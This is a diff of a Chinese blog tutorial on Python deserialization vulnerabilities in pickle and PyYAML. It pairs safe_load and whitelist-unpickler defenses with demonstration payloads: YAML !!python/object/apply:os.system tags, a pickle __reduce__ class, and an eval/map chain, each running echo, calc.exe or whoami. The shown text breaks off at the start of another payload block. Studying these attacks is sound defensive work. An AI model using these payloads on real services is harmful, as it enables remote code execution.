@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://Oight.github.io/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
 
-<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="Python反序列化">
+<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="Python反序列化">
 <meta property='og:description' content="Python 反序列化漏洞\r什么是Python的序列化与反序列化\r什么是Python的序列化\r众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。\n">
 <meta property='og:url' content='https://Oight.github.io/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
 <meta property='og:site_name' content='Oight'>
@@ -394,19 +394,7 @@
 使用pickle进行序列化生成的是二进制格式数据</li>
 </ol>
 <p>代码示例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">data = {&#34;name&#34;: &#34;Alice&#34;, &#34;age&#34;: 30}
 </span></span><span class="line"><span class="cl">serialized_data = pickle.dumps(data)  # 序列化为字节流
@@ -414,27 +402,13 @@
 </span></span><span class="line"><span class="cl"># 保存到文件
 </span></span><span class="line"><span class="cl">with open(&#34;data.pkl&#34;, &#34;wb&#34;) as f:
 </span></span><span class="line"><span class="cl">    pickle.dump(data, f)  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+</span></span></code></pre></div><ol>
 <li>json模块
 json可以生成人类可读的JSON字符串
 但json只支持基础类型（字典、列表、字符串、数字等），不支持Python特有对象（如类实例）的序列化。</li>
 </ol>
 <p>代码示例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import json
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import json
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">data = {&#34;name&#34;: &#34;Bob&#34;, &#34;age&#34;: 25}
 </span></span><span class="line"><span class="cl">json_str = json.dumps(data)  # 序列化为JSON字符串
@@ -442,30 +416,12 @@ json可以生成人类可读的JSON字符串
 </span></span><span class="line"><span class="cl"># 保存到文件
 </span></span><span class="line"><span class="cl">with open(&#34;data.json&#34;, &#34;w&#34;) as f:
 </span></span><span class="line"><span class="cl">    json.dump(data, f)  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+</span></span></code></pre></div><ol>
 <li>PyYAML库
 YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化格式，常用于配置文件和数据交换。Python 中通过 PyYAML 库支持 YAML。</li>
 </ol>
 <p>序列化实现：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import yaml
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import yaml
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">data = {
 </span></span><span class="line"><span class="cl">    &#34;name&#34;: &#34;Alice&#34;,
@@ -477,22 +433,8 @@ YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化格
 </span></span><span class="line"><span class="cl"># 序列化为YAML字符串
 </span></span><span class="line"><span class="cl">yaml_str = yaml.dump(data, default_flow_style=False)
 </span></span><span class="line"><span class="cl">print(yaml_str)  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">address:
+</span></span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">address:
 </span></span><span class="line"><span class="cl">city: Shanghai
 </span></span><span class="line"><span class="cl">zip: 200000
 </span></span><span class="line"><span class="cl">age: 30
@@ -500,30 +442,15 @@ YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化格
 </span></span><span class="line"><span class="cl">skills:
 </span></span><span class="line"><span class="cl">- Python
 </span></span><span class="line"><span class="cl">- YAML  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>保存/读取文件：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 写入文件</span>
+</span></span></code></pre></div><p>保存/读取文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 写入文件</span>
 </span></span><span class="line"><span class="cl"><span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s2">&#34;data.yaml&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 读取文件</span>
 </span></span><span class="line"><span class="cl"><span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s2">&#34;data.yaml&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">loaded_from_file</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">safe_load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+</span></span></code></pre></div><ol>
 <li>使用 Protocol Buffers（protobuf）实现序列化
 Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高性能通信和跨语言数据交换。需预先定义数据结构（.proto 文件）。</li>
 </ol>
@@ -533,34 +460,9 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </h4><p>YAML的反序列化过程通过PyYAML库实现，本质是将YAML文本解析为Python对象。默认的 <code>yaml.load()</code> 方法支持动态构造Python对象（包括类实例），但这也带来了安全风险。</p>
 <h5 id="反序列化步骤">反序列化步骤：
 </h5><p>1.安装依赖</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pip install pyyaml  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>2.基础反序列化（安全模式）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">yaml</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pip install pyyaml  
+</span></span></code></pre></div><p>2.基础反序列化（安全模式）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">yaml</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># YAML 文本（仅包含基础类型）</span>
 </span></span><span class="line"><span class="cl"><span class="n">yaml_text</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
@@ -574,58 +476,20 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl"><span class="c1"># 安全反序列化：仅解析基本类型（字典、列表等）</span>
 </span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">safe_load</span><span class="p">(</span><span class="n">yaml_text</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>  <span class="c1"># 输出 Alice  </span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>3.动态对象反序列化（危险！）：</p>
+</span></span></code></pre></div><p>3.动态对象反序列化（危险！）：</p>
 <p>  YAML 可以通过标签<code>（!!python/object）</code>动态构造 Python 对象，例如：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 恶意示例：反序列化时执行代码
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 恶意示例：反序列化时执行代码
 </span></span><span class="line"><span class="cl">!!python/object/apply:os.system [&#34;echo &#39;Hacked!&#39;&#34;]  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>  危险的反序列化代码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 不要对不可信数据使用 yaml.load()！</span>
+</span></span></code></pre></div><p>  危险的反序列化代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 不要对不可信数据使用 yaml.load()！</span>
 </span></span><span class="line"><span class="cl"><span class="n">malicious_yaml</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
 </span></span></span><span class="line"><span class="cl"><span class="s2">!!python/object/apply:os.system [&#34;echo &#39;Hacked!&#39;&#34;]
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">malicious_yaml</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">yaml</span><span class="o">.</span><span class="n">UnsafeLoader</span><span class="p">)</span>  <span class="c1"># 输出 Hacked!  </span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>安全实践</p>
+</span></span></code></pre></div><p>安全实践</p>
 <p>  始终使用 <code>yaml.safe_load()</code>：仅解析基础类型（字典、列表、字符串、数字），禁止动态对象构造。</p>
 <p>  禁用危险标签：若必须解析对象，需自定义加载器，过滤允许的类。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="n">SafeLoader</span><span class="p">,</span> <span class="ne">Node</span><span class="p">,</span> <span class="n">Constructor</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="n">SafeLoader</span><span class="p">,</span> <span class="ne">Node</span><span class="p">,</span> <span class="n">Constructor</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">RestrictedLoader</span><span class="p">(</span><span class="n">SafeLoader</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">construct_python_object</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">node</span><span class="p">:</span> <span class="ne">Node</span><span class="p">):</span>
@@ -638,26 +502,11 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl"><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">yaml_text</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">RestrictedLoader</span><span class="p">)</span>  <span class="c1"># 安全加载  </span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="pickle-反序列化实现">Pickle 反序列化实现
+</span></span></code></pre></div><h4 id="pickle-反序列化实现">Pickle 反序列化实现
 </h4><p>Pickle 的反序列化通过 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 实现，其底层会重建对象的完整状态，包括调用<code>__reduce__</code>方法（若存在），从而可能执行任意代码。</p>
 <h5 id="反序列化步骤-1">反序列化步骤：
 </h5><p>1.序列化一个对象：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">class User:
 </span></span><span class="line"><span class="cl">    def __init__(self, name):
@@ -666,40 +515,12 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl"># 序列化对象
 </span></span><span class="line"><span class="cl">user = User(&#34;Alice&#34;)
 </span></span><span class="line"><span class="cl">serialized = pickle.dumps(user)  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>2.基础反序列化:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 反序列化</span>
+</span></span></code></pre></div><p>2.基础反序列化:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 反序列化</span>
 </span></span><span class="line"><span class="cl"><span class="n">loaded_user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">serialized</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">loaded_user</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>  <span class="c1"># 输出 Alice  </span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>3.恶意反序列化示例:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+</span></span></code></pre></div><p>3.恶意反序列化示例:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Malicious</span><span class="p">:</span>
@@ -712,32 +533,13 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 反序列化触发攻击</span>
 </span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 输出 Hacked!  </span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>安全风险根源:</p>
+</span></span></code></pre></div><p>安全风险根源:</p>
 <p>  <code>__reduce__</code>方法：在反序列化时自动调用，返回一个元组（函数、参数），执行函数。</p>
 <p>  任意代码执行：攻击者可构造恶意<code>__reduce__</code>方法，执行危险操作（如删除文件、反弹Shell）。</p>
 <p>防御方法</p>
 <p>  避免反序列化不可信数据：永远不要对来源未知的数据使用 <code>pickle.load()</code>。</p>
 <p>  限制允许的类（白名单）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">SafeUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">allowed_classes</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;__main__.User&#34;</span><span class="p">}</span>  <span class="c1"># 仅允许User类</span>
@@ -750,9 +552,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 安全反序列化</span>
 </span></span><span class="line"><span class="cl"><span class="n">safe_data</span> <span class="o">=</span> <span class="n">SafeUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">serialized</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="反序列化漏洞的成因">反序列化漏洞的成因
+</span></span></code></pre></div><h4 id="反序列化漏洞的成因">反序列化漏洞的成因
 </h4><p>我们上面提到了YAML和pickle的反序列化过程以及他们的风险漏洞，这里来总结一下。</p>
 <h5 id="yaml的反序列化漏洞">YAML的反序列化漏洞
 </h5><p>造成YAML反序列化漏洞的原因是由于过于相信YAML数据来源，在反序列化的过程中使用了一些危险标签，使得攻击者利用这些标签使用 <code>yaml.load()</code> 方法来动态构造Python对象，导致程序错误地调用了 <code>os.system()</code> 进行命令执行</p>
@@ -771,55 +571,21 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </h3><p>我们已经讨论过Python中的反序列化漏洞是由于错误使用<code>yaml.load()</code>、危险标签和<code>__reduce__</code>，导致的命令执行漏洞，因此，我们的利用点也着眼于此。</p>
 <h4 id="yaml漏洞的利用">yaml漏洞的利用
 </h4><p>对于PyYaml&lt;5.1版本下的漏洞，其主要原因主要出现在下面五个python标签：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python/name
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python/name
 </span></span><span class="line"><span class="cl">python/module
 </span></span><span class="line"><span class="cl">python/object
 </span></span><span class="line"><span class="cl">python/object/new
 </span></span><span class="line"><span class="cl">python/object/apply
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>漏洞成因：</p>
+</span></span></code></pre></div><p>漏洞成因：</p>
 <p> 由于上面提到的五个标签，在constructor.py文件被加载器解析导致，攻击者利用这类标签可以达到任意命令执行，以及验证绕过等漏洞的利用。</p>
 <p>payload：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/apply:os.system [&#34;calc.exe&#34;]
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/apply:os.system [&#34;calc.exe&#34;]
 </span></span><span class="line"><span class="cl">!!python/object/new:os.system [&#34;calc.exe&#34;]    
 </span></span><span class="line"><span class="cl">!!python/object/new:subprocess.check_output [[&#34;calc.exe&#34;]]
 </span></span><span class="line"><span class="cl">!!python/object/apply:subprocess.check_output [[&#34;calc.exe&#34;]]  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p>
+</span></span></code></pre></div><p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p>
 <p>针对不同的需要，选择不同的加载器，有以下几种加载器</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">BaseConstructor</span><span class="err">：仅加载最基本的</span><span class="n">YAML</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">BaseConstructor</span><span class="err">：仅加载最基本的</span><span class="n">YAML</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">SafeConstructor</span><span class="err">：安全加载</span><span class="n">Yaml语言的子集</span><span class="err">，建议用于加载不受信任的输入（</span><span class="n">safe_load</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -828,67 +594,23 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl"><span class="n">UnsafeConstructor</span><span class="err">（也称为</span><span class="n">Loader向后兼容性</span><span class="err">）：原始的</span><span class="n">Loader代码</span><span class="err">，可以通过不受信任的数据输入轻松利用（</span><span class="n">unsafe_load</span><span class="err">）</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">Constructor</span><span class="err">：等同于</span><span class="n">UnsafeConstructor</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果说指定的加载器是UnsafeConstructor 或者Constructor，那么利用方式就照旧</p>
+</span></span></code></pre></div><p>如果说指定的加载器是UnsafeConstructor 或者Constructor，那么利用方式就照旧</p>
 <p>payload</p>
 <p>我们可以用python的内置函数eval（或者exec）来执行代码，用map来触发函数执行，用tuple将map对象转化为元组输出来（当然用list、frozenset、bytes都可以），用python写出来如下</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tuple(map(eval, [&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;]))
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>变为yaml</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tuple(map(eval, [&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;]))
+</span></span></code></pre></div><p>变为yaml</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
 </span></span></span><span class="line"><span class="cl"><span class="s2">!!python/object/new:tuple
 </span></span></span><span class="line"><span class="cl"><span class="s2">- !!python/object/new:map
 </span></span></span><span class="line"><span class="cl"><span class="s2">- !!python/name:eval
 </span></span></span><span class="line"><span class="cl"><span class="s2">- [&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;]
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>除此之外网上还有很多大佬有其他的payload</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
